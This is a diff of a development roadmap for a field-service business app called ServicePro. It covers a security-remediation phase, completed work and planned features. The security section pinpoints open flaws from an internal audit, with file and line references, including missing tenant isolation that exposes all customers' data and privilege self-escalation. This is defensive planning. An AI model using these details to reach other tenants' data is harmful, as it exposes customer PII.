+| T105     | 1     | Security       | 3     | Remove or lock the raw Stripe passthrough endpoints                                                   |
+| T106     | 1     | Security       | 5     | Backend-enforced invite-only registration; reject non-edge traffic in production                      |
+| T107     | 1     | Security       | 2     | Edge client-IP middleware and a safe trusted-proxy default                                            |
+| T108     | 1     | Security       | 2     | Escape PDF export HTML; drop wkhtmltopdf local file access                                            |
+| T109     | 1     | Security       | 5     | Stripe webhook reliability: persistent dedupe, accept retries, body limit, idempotent payment         |
+| T110     | 1     | Security       | 4     | Token hardening: access vs refresh type, revoke on logout and password reset                          |
+| T111     | 1     | Security       | 3     | Login hardening: no lockout DoS, uniform errors and timing                                            |
+| T112     | 1     | Security       | 1     | Neutralise CSV/Excel formula injection in exports                                                     |
+| T113     | 1     | Security       | 1     | Fail closed when no email or storage provider in production; never log tokens                         |
+| T114     | 1     | Security       | 2     | Lock down /health detail, /metrics, Swagger and debug mode in production                              |
+| T115     | 1     | Security       | 3     | Secure cookies by default and CSRF protection                                                         |
+| T116     | 1     | Security       | 3     | Low-severity security sweep                                                                           |
+| T117     | 1     | Security       | 3     | Remediate dependency vulnerabilities and bump the Go toolchain                                        |
+| T118     | 2     | Bug            | 3     | Recording a payment updates the invoice balance and status                                            |
+| T119     | 2     | Payments       | 3     | Stripe Checkout charges the true balance due                                                          |
+| T120     | 2     | Bug            | 2     | Invoice and job numbering survives soft-delete and concurrency                                        |
+| T121     | 2     | Bug            | 2     | Payment reminders actually send                                                                       |
+| T122     | 2     | Bug            | 2     | Fix /webhooks/stripe panicking on subscription and invoice events                                     |
+| T123     | 2     | Bug            | 3     | Add the missing SQL functions and views behind customer search and reports                            |
+| T124     | 2     | Bug            | 4     | Enforce invoice status transitions; unify the two job state machines                                  |
+| T125     | 2     | Payments       | 3     | Handle refunds in the ledger                                                                          |
+| T126     | 2     | Monitoring     | 2     | Backend Sentry actually initialised; wire or delete the Loki/BetterStack/OTel stubs                   |
+| T127     | 2     | Backend        | 3     | Backend reads tenant settings: currency, number prefixes, defaults                                    |
+| T128     | 2     | Backend        | 4     | Exports safe on multiple instances (object storage + persisted progress)                              |
+| T129     | 2     | Cleanup        | 4     | Backend dead-code removal and a stricter linter                                                       |
+| T130     | 2     | Bug            | 1     | Login error swallowed by the refresh interceptor                                                      |
+| T131     | 2     | Bug            | 1     | Public payment result pages for the /pay/:token flow                                                  |
+| T132     | 2     | Security       | 2     | Clear tenant and user data on logout and tenant switch                                                |
+| T133     | 2     | Bug            | 2     | Job times entered and shown in the tenant's timezone, stored as true UTC                              |
+| T134     | 2     | Security       | 1     | Strip sensitive query params from analytics and error breadcrumbs                                     |
+| T135     | 2     | Frontend       | 4     | Frontend medium-severity sweep                                                                        |
+| T136     | 2     | Testing        | 3     | Green frontend test suite and lint                                                                    |
+| T137     | 2     | Cleanup        | 3     | Frontend dead-code removal (~18.5k unreachable lines)                                                 |
+| T138     | 2     | UX             | 2     | Preview polish: honest contact form, legal pages marked draft, favicon                                |
+| T223     | 2     | Backend        | 4     | Request IDs and a standard API error envelope                                                         |
+| T224     | 2     | Bug            | 4     | Quote correctness: lost customer edits, accept race, expiry, editable sent quotes                     |
+| T225     | 2     | Bug            | 4     | Invoice totals: one server-side recalculation, tax/discount order, no double invoicing                |
+| T226     | 2     | Bug            | 3     | Tenant creation and invitation acceptance in transactions; per-tenant uniqueness                      |
+| T101     | 3     | Monitoring     | 2     | Upload source maps to Sentry for production builds                                                    |
+| T153     | 4     | Backend        | 24    | Repositories take ctx + tenantID; services stop taking *gorm.DB; transaction manager                  |
+| T154     | 4     | Security       | 12    | Postgres RLS backstop keyed on a per-transaction tenant GUC + isolation tests                         |
+| T155     | 4     | Backend        | 40    | Gin → chi                                                                                             |
+| T156     | 4     | Backend        | 120   | GORM → pgx/sqlc, one repository at a time                                                             |
+| T157     | 4     | Testing        | 16    | Drop GORM and sqlite; backend tests on Postgres via testcontainers                                    |
+| T158     | 4     | Auth           | 40    | Supabase Auth: own sign-in screens, JWKS verification, users.auth_user_id, invite flow                |
+| T159     | 4     | Email          | 6     | Email → Resend only (remove SES/SNS/CloudWatch and the AWS email SDKs)                                |
+| T160     | 4     | Infra          | 4     | Storage → Cloudflare R2 (fix presign host rewrite)                                                    |
+| T161     | 4     | Infra          | 4     | Production Redis: Upstash for rate limits/lockout/cache, or move them to Postgres                     |
+| T162     | 4     | Frontend       | 48    | Frontend server state → TanStack Query v5 (~26 pages)                                                 |
+| T163     | 4     | Frontend       | 40    | Tailwind v4 + semantic theme tokens + dark mode                                                       |
+| T164     | 4     | Frontend       | 16    | React 19, React Router 7, Vite major, ESLint 9, Headless UI 2                                         |
+| T165     | 4     | Monitoring     | 4     | Better Stack uptime/status + PostHog server-side events parity                                        |
+| T166     | 4     | Research       | 2     | Decide money representation (decimal vs integer cents) before the pgx port                            |
+| T028     | 5     | Feature        | 3     | Add "Convert Quote to Job" button                                                                     |
+| T029     | 5     | Feature        | 2     | Add "Generate Invoice from Job" button                                                                |
+| T030     | 5     | Feature        | 4     | Auto-populate invoice from job data                                                                   |
+| T033     | 5     | Reporting      | 2     | Add "Jobs Needing Invoice" dashboard widget                                                           |
+| T035     | 5     | Auth           | 4     | Create Technician role                                                                                |
+| T041     | 5     | Feature        | 6     | Implement quote auto follow-ups                                                                       |
+| T042     | 5     | UX             | 4     | Build follow-up queue UI                                                                              |
+| T051     | 5     | Email          | 4     | Implement quote follow-up email sequence                                                              |
+| T052     | 5     | Auth           | 3     | Create Dispatcher role                                                                                |
+| T058     | 5     | Feature        | 4     | Add required fields validation by job stage                                                           |
+| T060     | 5     | Feature        | 8     | Create quote template system (good/better/best)                                                       |
+| T062     | 5     | Feature        | 2     | Add quote aging tracking                                                                              |
+| T076     | 5     | Feature        | 1     | Add "Recreate Last Quote" button                                                                      |
+| T080     | 5     | Feature        | 3     | Create terms & conditions templates                                                                   |
+| T082     | 5     | Feature        | 2     | Add "Create Quote from Job" button                                                                    |
+| T167     | 5     | Feature        | 12    | Recurring service agreements UI wired to the recurrence engine                                        |
+| T168     | 5     | Feature        | 12    | Price book (services and materials catalog with flat-rate pricing)                                    |
+| T061     | 6     | Payments       | 6     | Add required deposit to accept quote                                                                  |
+| T063     | 6     | Payments       | 6     | Add deposit tracking and application                                                                  |
+| T083     | 6     | Payments       | 4     | Implement late fee calculation                                                                        |
+| T169     | 6     | Payments       | 24    | Stripe Connect Express onboarding; invoice payments routed to the tenant                              |
+| T170     | 6     | Payments       | 6     | Card + ACH invoice payments, ACH preferred for B2B                                                    |
+| T171     | 6     | Payments       | 10    | Saved payment methods + autopay                                                                       |
+| T172     | 6     | Payments       | 16    | Tap to Pay via Stripe Terminal                                                                        |
+| T027     | 7     | Feature        | 8     | Add drag-and-drop rescheduling to job calendar                                                        |
+| T038     | 7     | Feature        | 6     | Add technician availability management UI                                                             |
+| T039     | 7     | Feature        | 8     | Create emergency job insertion workflow                                                               |
+| T040     | 7     | SMS            | 3     | Add auto-notify on emergency insertion                                                                |
+| T056     | 7     | Feature        | 3     | Add workload capacity warnings                                                                        |
+| T057     | 7     | Feature        | 2     | Add double-booking override with reason                                                               |
+| T059     | 7     | Feature        | 3     | Add technician skill tags                                                                             |
+| T077     | 7     | Feature        | 4     | Add time-off request UI                                                                               |
+| T078     | 7     | Feature        | 4     | Add skill-based job matching suggestions                                                              |
+| T079     | 7     | Feature        | 1     | Add travel time notes field                                                                           |
+| T099     | 7     | Backend        | 4     | Add tenant timezone support for conflict detection                                                    |
+| T173     | 7     | Mobile         | 24    | Technician "My Day" mobile-first view                                                                 |
+| T174     | 7     | Feature        | 8     | Job photos and attachments (R2)                                                                       |
+| T175     | 7     | Feature        | 12    | Job checklists / forms                                                                                |
+| T176     | 7     | Feature        | 8     | Customer signature on completion + service report PDF emailed                                         |
+| T177     | 7     | Feature        | 12    | Time clock per job + timesheet export                                                                 |
+| T178     | 7     | Feature        | 8     | Map / route view of the day                                                                           |
+| T179     | 7     | Mobile         | 40    | Offline-capable tech app (queue + sync)                                                               |
+| T180     | 7     | Mobile         | 24    | Capacitor-wrapped iOS/Android apps in the stores                                                      |
+| T036     | 8     | Feature        | 3     | Add manual Call Log entry                                                                             |
+| T037     | 8     | Feature        | 4     | Auto-log system messages to customer activity                                                         |
+| T048     | 8     | Email          | 3     | Add appointment confirmation emails                                                                   |
+| T049     | 8     | SMS            | 4     | Add appointment reminder emails/SMS                                                                   |
+| T050     | 8     | SMS            | 2     | Add "Tech on the way" manual trigger                                                                  |
+| T054     | 8     | UX             | 4     | Create Communication Log component                                                                    |
+| T055     | 8     | UX             | 8     | Unified Customer Timeline view                                                                        |
+| T072     | 8     | Feature        | 6     | Create message template management UI                                                                 |
+| T073     | 8     | Feature        | 4     | Add rich variable system for templates                                                                |
+| T089     | 8     | Email          | 6     | Add email/SMS delivery tracking                                                                       |
+| T090     | 8     | Monitoring     | 3     | Add communication failure alerts                                                                      |
+| T091     | 8     | Feature        | 4     | Add notification preferences per customer                                                             |
+| T181     | 8     | SMS            | 20    | Two-way SMS inbox (Twilio + 10DLC)                                                                    |
+| T182     | 8     | Marketing      | 4     | Review request automation                                                                             |
+| T081     | 9     | Feature        | 4     | Add e-signature for quote acceptance                                                                  |
+| T183     | 9     | Feature        | 10    | Public quote approval page (approve/decline, e-sign, optional deposit)                                |
+| T184     | 9     | Feature        | 24    | Customer portal / client hub                                                                          |
+| T185     | 9     | Feature        | 12    | Online booking / request widget embeddable on websites                                                |
+| T044     | 10    | Feature        | 8     | Build collections dashboard                                                                           |
+| T064     | 10    | Feature        | 2     | Add last contact date tracking on invoices                                                            |
+| T065     | 10    | Feature        | 3     | Add promise-to-pay notes                                                                              |
+| T186     | 10    | Feature        | 16    | Multi-site customers (service locations; invoice per site or consolidated)                            |
+| T187     | 10    | Feature        | 6     | PO capture and matching on jobs and invoices                                                          |
+| T188     | 10    | Feature        | 8     | Consolidated monthly invoicing                                                                        |
+| T189     | 10    | Feature        | 6     | Statements of account (portal + email)                                                                |
+| T190     | 10    | Feature        | 24    | Property-manager approval workflow (NTE limits, multi-approver, email intake)                         |
+| T191     | 10    | Feature        | 12    | Maintenance agreements with autopay + renewal reminders                                               |
+| T095     | 11    | Integration    | 12    | Build outgoing webhooks system                                                                        |
+| T096     | 11    | Backend        | 4     | Build event log table                                                                                 |
+| T097     | 11    | Integration    | 4     | Add webhook retry logic                                                                               |
+| T098     | 11    | Docs           | 3     | Document public API (OpenAPI/Swagger)                                                                 |
+| T192     | 11    | Integration    | 32    | QuickBooks Online sync (customers, invoices, payments; one-way first)                                 |
+| T193     | 11    | Integration    | 8     | Import mappers for Jobber / Housecall Pro exports + generic CSV                                       |
+| T194     | 11    | Integration    | 12    | Zapier app                                                                                            |
+| T195     | 11    | Integration    | 8     | Wisetack consumer financing                                                                           |
+| T196     | 11    | Integration    | 12    | Gusto payroll / timesheets                                                                            |
+| T197     | 11    | Integration    | 8     | AI receptionist partner integration                                                                   |
+| T045     | 12    | Reporting      | 2     | Add aging quotes dashboard widget                                                                     |
+| T046     | 12    | Reporting      | 2     | Add follow-up queue dashboard widget                                                                  |
+| T047     | 12    | Reporting      | 4     | Build "stuck work" report                                                                             |
+| T066     | 12    | Reporting      | 4     | Add technician utilization widget                                                                     |
+| T067     | 12    | Reporting      | 2     | Add quote conversion rate metric                                                                      |
+| T068     | 12    | Reporting      | 3     | Build job-completion-to-invoice time report                                                           |
+| T069     | 12    | Reporting      | 3     | Build invoice-to-paid time report (DSO)                                                               |
+| T070     | 12    | Reporting      | 3     | Build revenue by service type report                                                                  |
+| T071     | 12    | Reporting      | 3     | Build collections rate report                                                                         |
+| T084     | 12    | Reporting      | 3     | Build quote-to-job conversion report                                                                  |
+| T085     | 12    | Reporting      | 3     | Build lead-to-quote time report                                                                       |
+| T086     | 12    | Reporting      | 2     | Build quote-to-acceptance time report                                                                 |
+| T087     | 12    | Reporting      | 3     | Build revenue by technician report                                                                    |
+| T088     | 12    | Reporting      | 4     | Add comparative analysis (vs prior period)                                                            |
+| T198     | 12    | Reporting      | 12    | Job costing / profit per job                                                                          |
+| T074     | 13    | Auth           | 3     | Create Accountant role                                                                                |
+| T075     | 13    | Auth           | 12    | Add field-level permission controls                                                                   |
+| T092     | 13    | Auth           | 6     | Implement 2FA (TOTP)                                                                                  |
+| T093     | 13    | Backend        | 12    | Implement comprehensive audit logging                                                                 |
+| T094     | 13    | Auth           | 0     | Add Google OAuth sign-in (Won't Do)                                                                   |
+| T199     | 13    | Feature        | 6     | One-click full data export (trust promise)                                                            |
+| T200     | 13    | Legal          | 6     | Account/tenant deletion + data retention policy                                                       |
+| T201     | 13    | Legal          | 3     | Privacy/CCPA handling SOP                                                                             |
+| T202     | 14    | Research       | 1     | Decide production database hosting (OWNER DECISION)                                                   |
+| T203     | 14    | Deploy         | 4     | GCP project + WIF + Artifact Registry + Cloud Run service                                             |
+| T204     | 14    | Deploy         | 2     | Deploy the Worker + DNS for servicepro.sharkfins.xyz                                                  |
+| T205     | 14    | Deploy         | 2     | Invite-gated preview launch                                                                           |
+| T206     | 14    | Email          | 2     | Production email domain on Resend (SPF/DKIM/DMARC)                                                    |
+| T207     | 14    | Legal          | 4     | Terms of Service + Privacy Policy legal review                                                        |
+| T208     | 14    | Ops            | 2     | Support inbox + Better Stack status page                                                              |
+| T209     | 14    | Ops            | 2     | Activate nightly backups to R2 + restore drill                                                        |
+| T210     | 14    | Billing        | 12    | ServicePro plans & billing: Solo/Team/Pro flat, unlimited users, founding offer                       |
+| T211     | 14    | Docs           | 1     | Update Fleet and the blog when ServicePro goes live                                                   |
+| T212     | 14    | Ops            | 2     | Production config review                                                                              |
+| T213     | 14    | Ops            | 1     | Cost guardrails (Cloud Run max instances × DB pool, budget alerts)                                    |
+| T214     | 15    | AI             | 24    | AI collections agent                                                                                  |
+| T215     | 15    | AI             | 20    | AI quote drafting from photos, voice or notes against the price book                                  |
+| T216     | 15    | AI             | 12    | "Ask your business" chat over reporting views                                                         |
+| T217     | 15    | AI             | 12    | MCP server for ServicePro                                                                             |
+| T218     | 16    | Research       | 10    | Customer discovery: interview 10 commercial service contractors                                       |
+| T219     | 16    | Marketing      | 12    | Marketing site with positioning + transparent pricing                                                 |
+| T220     | 16    | Marketing      | 4     | White-glove migration offer + playbook                                                                |
+| T221     | 16    | Marketing      | 8     | Comparison / alternative pages (vs Jobber, Housecall Pro, ServiceTitan)                               |
+| T222     | 16    | Research       | 6     | Validate secondary beachhead (inspection/compliance trades)                                           |
 
 ---
 
-## Verified Complete ✓
+## Phase Roadmap
 
-- [x] Rate limiting - Multi-tier with Redis backing, applied globally via DynamicRateLimit()
-- [x] PDF generation - Quotes, Invoices, Receipts with S3 storage and email attachments
-- [x] SMS integration - TextBelt, SNS, Mock providers with pluggable architecture
-- [x] httpOnly cookies - SameSite=Lax for CSRF protection
-- [x] Security headers (backend) - CSP, HSTS, X-Frame-Options in middleware
-- [x] Error tracking client - Sentry integration at pkg/clients/errortracking
-- [x] .env in .gitignore - Properly excluded (lines 42-50)
-- [x] Console.log stripping - Terser `drop_console: true` in production build
-- [x] Migrate `db.Raw()` to GORM (SQL injection risk)
-- [x] **T013** - Frontend test coverage 70%+ (52 test files, 1251 tests, coverage: 69.87% statements, 72.49% functions, 70.99% lines)
-- [x] **T014** - Integration tests for critical workflows (auth, customer CRUD, job lifecycle, quote workflow, invoice & payment)
-- [x] Cypress E2E testing - Auth, customers, jobs, invoices, quotes, payments
-- [x] Graceful shutdown - SIGTERM/SIGINT handling with 30s timeout in cmd/main.go
-- [x] HTTP server timeouts - ReadTimeout, WriteTimeout, IdleTimeout, ReadHeaderTimeout configured via http.Server
-- [x] MaxMultipartMemory - Configurable via SERVER_MAX_MULTIPART_MEMORY env var, applied to router
-- [x] TrustedProxies - Configurable via SERVER_TRUSTED_PROXIES env var, applied to router
-- [x] Deep health checks - /health, /health/live, /health/ready with DB + Redis connectivity checks
-- [x] localStorage token fix - ConflictChecker.tsx now uses api service with httpOnly cookies
-- [x] T001: Recovery middleware Sentry integration - Panics captured with stack trace, request context, user ID
-- [x] T002: Centralized fetch() calls - pdfGenerator.tsx, useQuoteCalculations.ts now use api service
-- [x] T003: nginx security headers - CSP, HSTS, Permissions-Policy added to nginx.conf
-- [x] T004: GitHub Actions CI/CD - checks.yml, release.yml, deploy-release.yml already exist
-- [x] T005: Prometheus /metrics endpoint - Enabled via PROMETHEUS_ENABLED=true, uses existing prometheus client
-- [x] T006: Structured JSON logging - Migrated all fmt.Printf/log.Printf to structured logging client with global logger pattern
-- [x] T007: Fix `any` types - Replaced 50+ `any` types with proper TypeScript types, created error utility, fixed all test mocks
-- [x] T008: Remove @ts-nocheck - Removed directives from routes/index.tsx and performance.ts, added browser API type declarations
-- [x] T009: Enable noUnusedLocals/noUnusedParameters - Enabled strict checks, removed 17 instances of dead code
-- [x] T010: Error tracking middleware - Already implemented via RecoveryMiddleware in error_handler.go
-- [x] T019: Calendar view for job scheduling - Read-only calendar at `/jobs/calendar`, click to view job details, status color mapping
-- [x] T015: OpenAPI/Swagger documentation - Backend generates swagger.json via swag, Swagger UI at `/api/docs`, frontend generates TypeScript types via `npm run generate:api`
-- [x] T021: Extract duplicate file download utility - Created `src/utils/fileDownload.ts` with `downloadFile()`, `downloadCSV()`, `downloadJSON()`, `downloadPDF()`, `openBlobInNewTab()`, and `downloadFromDataURL()`. Refactored 10 files to use the utility.
-- [x] T031: Build A/R aging buckets report - Backend: `/backend/internal/models/ar_aging_report.go`, `/backend/internal/services/ar_aging_service.go`, `/backend/internal/api/handlers/ar_aging_handler.go`. Frontend: `/frontend/src/types/arAging.ts`, `/frontend/src/services/arAgingService.ts`, `/frontend/src/pages/Reports/ARAgingReportPage.tsx`. Displays receivables by age (Current, 1-30, 31-60, 61-90, 90+), drill-down to invoices, CSV export.
-- [x] T018: Dead code elimination - Removed ~2,700 lines of dead code. Added ts-prune for automated detection with baseline of 116 known unused exports. Pre-commit hook and CI job prevent new dead code. Run `npm run dead-code` to check, `npm run dead-code:update` to update baseline.
-- [x] T016: Frontend bundle optimization - Reduced gzipped bundle from 720KB → 322KB (-55%). Lazy-loaded @react-pdf/renderer via dynamic import, fixed chunk splitting (exact boundary matching in manualChunks), created dedicated vendor-calendar/vendor-pdf/vendor-table chunks, fixed analyze-bundle.cjs ESM issue.
-- [x] T017: Query performance monitoring - Custom GORM logger with slow query detection (>=100ms WARN, >=1s ERROR). Prometheus metrics: `db_query_duration_seconds`, `db_queries_total`, `db_query_errors_total` with operation/table labels. Connection pool gauges (open/idle/in-use/max/wait). Configurable via `DB_SLOW_QUERY_THRESHOLD`, `DB_QUERY_ALERT_THRESHOLD`, `DB_LOG_ALL_QUERIES`.
-- [x] T012: Bundle size monitoring in CI - Markdown reports in CI step summaries, pre-push hook validation, release script gate. Thresholds: 500KB warn, 750KB fail (total JS gzipped). Per-chunk budgets for vendor splits. Chunk breakdown visible in all reports.
-- [x] T020: Build conflict detection API endpoint - `POST /v1/conflicts/check` wires existing `ConflictDetector` service to API. Handler extracts tenant from auth context, passes to detector. Fixed tenant scoping gap in `GetByTechnicianAndDateRange()` and `GetByDateRange()`. Detects technician overlap, business hours violations, workload excess. Returns resolution suggestions.
-- [x] T053: Add "Repeat Job" button on customer detail - `?clone=` query param on JobDetailPage pre-fills form from source job (title, type, priority, duration, notes, instructions, materials). Customer detail page shows recent jobs with "Repeat Job" and "View" buttons. JobActionsMenu also has "Repeat Job" option. "New Job" from customer page pre-selects customer via navigation state.
-- [x] T032: Build "Who Owes What" report - Addressed by adding customer filter dropdown to existing A/R Aging Report (T031). Backend already supported `customer_id` filtering; added UI dropdown on `ARAgingReportPage.tsx`. Fixed Gin UUID query binding issue (`ShouldBindQuery` can't bind `*uuid.UUID` — split into string field + manual parse via `ParseCustomerID()`).
-- [x] T034+T043: Payment reminder automation - Merged T034 (payment reminder emails) and T043 (overdue invoice notifications) into single implementation. Backend: `payment_reminders` table, `PaymentReminderService` with background worker (hourly), escalating tone (friendly→firm→final based on days overdue), multi-channel (email/SMS) with customer preference resolution. API: `GET/POST /invoices/:id/reminders`, `GET/PUT /settings/payment-reminders`. Frontend: Notifications tab in Org Settings (enable toggle, configurable day schedule, max reminders), Payment Reminders section on Invoice Detail (history table, manual send button with confirmation).
-- [x] T024: Full Sentry integration - Added GlitchTip (Sentry-compatible, lightweight) to docker-compose with separate Postgres + Celery worker. Frontend: initialized Sentry SDK in `main.tsx`, wrapped App in `ErrorBoundary`, set user context on login/logout/checkAuth in `authStore.ts`. Backend already wired via factory pattern. Optional — no DSN = mock/no-op. Source maps deferred to T101.
-- [x] T025: PostHog product analytics - Frontend: `posthog-js` SDK with analytics service (`initAnalytics`, `trackEvent`, `identifyUser`, `resetUser`), type-safe event constants, `PageViewTracker` component, `useAnalytics` hook. Workflow events: quote_created/sent/accepted/rejected, job_created/completed/status_changed, invoice_created/sent, export_downloaded. Backend: `posthog-go` SDK with pluggable client (factory pattern mirroring errortracking), PostHog + mock providers. Server-side Stripe webhook → payment_received. No API key = mock/no-op.
-- [x] T026: Grafana KPI dashboard - Replaced Metabase with Grafana OSS in docker-compose.yml (port 3001). Auto-provisioned PostgreSQL data source and pre-built dashboard (no setup wizard needed). Created 8 PostgreSQL views for KPIs: `v_platform_overview`, `v_tenant_growth_daily`, `v_feature_adoption`, `v_job_metrics_daily`, `v_invoice_metrics_daily`, `v_quote_conversion`, `v_revenue_daily`, `v_ar_aging_summary`. Dashboard panels: stat counters, tenant growth time-series, jobs created/completed, invoice volume, revenue trend, feature adoption table, quote conversion bar gauge, A/R aging chart. Grafana Cloud free tier available for production (3 users, 10k metrics).
+### Phase 0 — Before 2026-10-16
+
+Work completed under the old P0–P3/sprint TODO. Details are in Verified Complete.
+
+- [x] T001 — Recovery middleware Sentry integration
+- [x] T002 — Centralize direct fetch() calls
+- [x] T003 — Add CSP/HSTS headers to nginx.conf
+- [x] T004 — Create GitHub Actions CI/CD workflows
+- [x] T005 — Expose /metrics endpoint for Prometheus
+- [x] T006 — Structured JSON logging (replace fmt.Printf)
+- [x] T007 — Fix `any` types (50 instances)
+- [x] T008 — Remove @ts-nocheck directives
+- [x] T009 — Enable noUnusedLocals/noUnusedParameters
+- [x] T010 — Apply error tracking middleware
+- [x] T012 — Bundle size monitoring in CI
+- [x] T013 — Increase frontend test coverage to 70%+
+- [x] T014 — Integration tests for critical workflows
+- [x] T015 — Generate OpenAPI/Swagger documentation
+- [x] T016 — Frontend bundle analysis + optimization
+- [x] T017 — Query performance monitoring
+- [x] T018 — Dead code elimination
+- [x] T019 — Integrate calendar view for job scheduling
+- [x] T020 — Build conflict detection API endpoint
+- [x] T021 — Extract duplicate file download utility
+- [x] T022 — Extract duplicate URLSearchParams builder
+- [x] T023 — Consolidate cache hooks (useLocalCache/useSession)
+- [x] T024 — Full Sentry integration (frontend + backend)
+- [x] T025 — Integrate product analytics (PostHog)
+- [x] T026 — Set up business KPI dashboard (Grafana)
+- [x] T031 — Build A/R aging buckets report
+- [x] T032 — Build "Who Owes What" report
+- [x] T034 — Wire payment reminder automation
+- [x] T043 — Wire payment reminder notifications
+- [x] T053 — Add "Repeat Job" button on customer detail
+- [x] T100 — Add business hours & timezone to org settings
 
 ---
 
-## P0 - Critical (Blocks Production)
+### Phase 1 — Security Remediation (T102, T103, T104, T105, T106, T107, T108, T109, T110, T111, T112, T113, T114, T115, T116, T117)
 
-### Backend Server Configuration
+**Blocks any hosting, even invite-only.** From the 2026-10-16 security audit (`docs/audits/2026-10-16/backend-security.md`): there is no tenant isolation and any user can make themselves super_admin. Nothing gets a URL until every task here is done. **16 open tasks, ~63h.**
 
-- [x] **T001: Recovery Middleware Sentry Integration** ✓ COMPLETE
-  - Updated `RecoveryMiddleware` to accept `errortracking.Client`
-  - Panics are now captured with full context: stack trace, request method/path, user ID
-  - Changed `gin.Default()` to `gin.New()` to use custom recovery instead of Gin's default
-  - Middleware applied first in route setup to catch all panics
+- [ ] T102 — Tenant-scope all business data
+- [ ] T103 — Authorize tenant member, invitation and role endpoints; no self-escalation
+- [ ] T104 — Evaluate permissions per tenant
+- [ ] T105 — Remove or lock the raw Stripe passthrough endpoints
+- [ ] T106 — Backend-enforced invite-only registration; reject non-edge traffic in production
+- [ ] T107 — Edge client-IP middleware and a safe trusted-proxy default
+- [ ] T108 — Escape PDF export HTML; drop wkhtmltopdf local file access
+- [ ] T109 — Stripe webhook reliability: persistent dedupe, accept retries, body limit, idempotent payment
+- [ ] T110 — Token hardening: access vs refresh type, revoke on logout and password reset
+- [ ] T111 — Login hardening: no lockout DoS, uniform errors and timing
+- [ ] T112 — Neutralise CSV/Excel formula injection in exports
+- [ ] T113 — Fail closed when no email or storage provider in production; never log tokens
+- [ ] T114 — Lock down /health detail, /metrics, Swagger and debug mode in production
+- [ ] T115 — Secure cookies by default and CSRF protection
+- [ ] T116 — Low-severity security sweep
+- [ ] T117 — Remediate dependency vulnerabilities and bump the Go toolchain
 
-### Frontend Critical
+#### T102 — Tenant-scope all business data
 
-- [x] **T002: Centralize Direct fetch() Calls** ✓ COMPLETE
-  - All API calls now go through `frontend/src/services/api.ts`
-  - Fixed: `pdfGenerator.tsx`, `useQuoteCalculations.ts`
-  - No direct `fetch('/api/...')` calls remain
+**Phase**: 1 · **Category**: Security · **Hours**: 16 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
 
-- [x] **T003: Add Security Headers to nginx.conf** ✓ COMPLETE
-  - Added HSTS: `max-age=31536000; includeSubDomains`
-  - Added CSP: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; ...`
-  - Added Permissions-Policy to disable unused browser features
-  - Updated Referrer-Policy to `strict-origin-when-cross-origin`
+**What it is** — Every tenant-owned row (customers, jobs, quotes, invoices, invoice lines, payments, export/import jobs, payment terms, tax rates, templates, schedules) carries a NOT NULL `tenant_id` set from the request context, and every repository read and write filters on it.
 
-### Infrastructure & Deployment
+**What it does** — Add `TenantID uuid.UUID` to the models that lack it (e.g. `internal/models/customer.go:39` `Customer`, `internal/models/invoice.go:95` `Invoice`), set it from context on create, and add a `TenantScope(tenantID)` GORM scope so get/update/delete become `WHERE id = ? AND tenant_id = ?` (today `customer_repository.go:45-55` is `WHERE id = ?`, and `List`, `Search`, `Autocomplete`, `GetSearchStats` are the same). Mount `RequireTenant` on the Customer, Quote, Invoice, Export, Report and Payment-terms route groups (`routes/v1/*_routes.go`); make the job repository honour the tenant that `jobs_routes.go:14` already resolves. Scope exports: `unified_export_service.go:259-288` (`fetchCustomers` dumps every customer in the DB) and the download at `export_handler.go:212` + `unified_export_service.go:936` (checks only `id = ?`) must check tenant and owner. Backfill, then make the nullable columns at `001_schema.sql:1106-1141` NOT NULL with `(tenant_id, …)` indexes, and make invoice/quote/job numbers unique per tenant (`invoice_number VARCHAR(50) UNIQUE`, line 571). Add integration tests where tenant B tries to read, update and delete tenant A's IDs and gets 404.
 
-- [x] **T004: Create GitHub Actions CI/CD Workflows** ✓ COMPLETE
-  - `checks.yml` - Lint (pre-commit), backend tests, frontend tests on push/PR
-  - `release.yml` - Creates GitHub Release with changelog on version tags
-  - `deploy-release.yml` - Tests + deploys to Fly.io (backend) and Cloudflare Pages (frontend) on version tags
+**Why we need it** — There is no tenant isolation today: with any account, `GET /api/v1/customers` returns every company's customers with PII; `/invoices`, `/quotes`, `/jobs`, `/exports` and `/reports/*` are the same, and writes and deletes are global too. It is also a correctness bug: the A/R aging report (`ar_aging_service.go:91,206`) and payment reminders (`payment_reminder_service.go:101`) filter on a `tenant_id` that is never written, so they always come back empty for API-created data.
 
-### Observability - Critical
-
-- [x] **T005: Expose /metrics Endpoint** ✓ COMPLETE
-  - Added metrics client initialization in `cmd/main.go`
-  - Added `/metrics` endpoint in `routes.go` (enabled via `PROMETHEUS_ENABLED=true`)
-  - Uses existing Prometheus client at `pkg/clients/metrics/prometheus/`
-  - Ready for Prometheus/Grafana scraping when monitoring is set up
-
-### Scheduling - Critical
-
-- [x] **T020: Build Conflict Detection API Endpoint** ✓ COMPLETE
-  - Created `POST /v1/conflicts/check` endpoint wiring existing conflict detector service to the API
-  - Created `conflict_handler.go` with Swagger annotations, `conflicts_routes.go` with auth + tenant + permission middleware
-  - Wired handler, service, and schedule repository into routeconfigs, repositories, services, handlers, and setup
-  - Fixed multi-tenant safety: `GetByTechnicianAndDateRange()` and `GetByDateRange()` now filter by `tenant_id`
-  - Added `TenantID` field to `ConflictCheckRequest` (set from auth context, not from JSON body)
-  - Updated all callers (detector, resolver, validator) and test mocks for new tenant-scoped signatures
-  - All conflict types detected: technician overlap, business hours, workload excess
-  - Resolution suggestions generated for each conflict type
-  - Regenerated Swagger docs and frontend TypeScript types
-
-### Quoting - Critical
-
-- [ ] **T028: Add "Convert Quote to Job" Button**
-  - **What**: One-click conversion from accepted quote to scheduled job
-  - **Why**: Core workflow - customer accepts quote, office manager needs to immediately schedule the work
-  - **Confidence**: High - straightforward data mapping between quote and job
-  - **Context**: Field service businesses live and die by this flow: quote accepted → job scheduled → work done → invoice sent
-  - **Implementation**:
-    - Add button on QuoteDetailPage when status is "accepted"
-    - Create job with customer, service type, line items from quote
-    - Navigate to job detail or scheduling view
-  - **Acceptance Criteria**:
-    - Button visible only on accepted quotes
-    - Job created with all relevant quote data
-    - User can immediately schedule the new job
-
-### Invoicing - Critical
-
-- [ ] **T029: Add "Generate Invoice from Job" Button**
-  - **What**: One-click invoice generation from completed job
-  - **Why**: Core workflow - prevents "completed but not billed" revenue leakage
-  - **Confidence**: High - clear data flow from job to invoice
-  - **Context**: Techs complete work, office forgets to bill. This button makes billing instant.
-  - **Implementation**:
-    - Add button on JobDetailPage when status is "completed"
